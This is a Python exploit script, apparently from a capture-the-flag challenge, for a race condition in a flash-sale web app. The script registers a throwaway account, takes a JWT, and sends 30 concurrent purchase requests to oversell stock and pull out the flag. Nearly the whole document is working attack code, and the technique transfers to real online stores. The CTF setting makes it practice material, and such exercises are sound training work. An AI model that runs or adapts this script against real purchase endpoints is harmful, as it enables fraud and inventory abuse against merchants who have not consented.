#!/usr/bin/env python3
# Race-condition oversell exploit for boazak--evala (FlashSale).
# Fill BUY_PATH once the purchase endpoint is known, then run.
import urllib.request, json, random, concurrent.futures, sys

B = 'https://r6qb43qxvurmkvyo.t.ctf.tg'   # instance URL (re-spawn if expired)
BUY_PATH = sys.argv[1] if len(sys.argv) > 1 else '/api/buy'   # <-- the unknown endpoint
BUY_METHOD = 'POST'
BUY_BODY = {}            # adjust if the endpoint needs {"item_id":1} etc.
N = 30                   # concurrent requests (app ~14 workers; sleep(0.1) window is wide)

def post(p, body):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            B + p, data=json.dumps(body).encode(),
            headers={'User-Agent': 'x', 'Content-Type': 'application/json'}, method='POST'), timeout=15)
        return r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.read().decode('utf-8', 'replace')

# fresh account + JWT
cred = {'username': 'race_%d' % random.randint(10000, 99999), 'password': 'P!1'}
post('/register', cred)
tok = json.loads(post('/login', cred))['access_token']
H = {'User-Agent': 'x', 'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'}

def buy(i):
    try:
        data = json.dumps(BUY_BODY).encode() if BUY_METHOD == 'POST' else None
        r = urllib.request.urlopen(urllib.request.Request(
            B + BUY_PATH, data=data, headers=H, method=BUY_METHOD), timeout=20)
        return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return 0, str(e)[:40]

print('stock before:', post('/api/stock', {}) if False else None)
results = list(concurrent.futures.ThreadPoolExecutor(max_workers=N).map(buy, range(N)))
for st, body in results:
    if 'NCTF{' in body:
        print('*** FLAG:', body)
    elif st == 200:
        print('ok:', body[:120])
for st, body in results:
    if 'NCTF{' in body:
        break
# print stock after
try:
    print('stock after:', urllib.request.urlopen(B + '/api/stock', timeout=10).read().decode())
except Exception:
    pass
